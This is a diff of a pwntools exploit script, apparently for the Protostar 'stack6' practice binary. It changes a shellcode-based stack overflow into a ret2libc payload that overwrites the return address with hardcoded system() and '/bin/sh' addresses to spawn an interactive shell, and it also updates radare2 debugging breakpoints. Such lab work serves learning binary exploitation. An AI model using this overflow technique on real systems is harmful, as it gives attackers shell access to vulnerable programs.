@@ -5,17 +5,20 @@ from pwn import *
 import os
 import sys
 
-_DEBUG = False
+_DEBUG = True
 
-io = process('../bin/stack7')
+io = process('../bin/stack6', aslr=False)
 
 pack = make_packer()
 unpack = make_unpacker()
 
+_bin_sh = pack(0x2aa00dc8)
+system  = pack(0x2a8deb40)
+pop_edx = pack(0x2aa84dca)
+
 def radare2():
     c = "aaaa; db main; "
-    c += "db 0x08048502; "
-    c += "db 0x08048552; "
+    c += "db 0x080484f9; "
     c += "db; "
 
     pid = util.proc.pidof(io)[0]
@@ -23,8 +26,7 @@ def radare2():
     util.proc.wait_for_debugger(pid)
 
 def exploit():
-    shell = asm(shellcraft.sh())
-    io.sendline(shell + 'A' * (72 - len(shell)) + pack(0xffffcdbc))
+    io.sendline('A' * 80 + system + 'BBBB' + _bin_sh)
     io.interactive()
 
 if __name__ == "__main__":
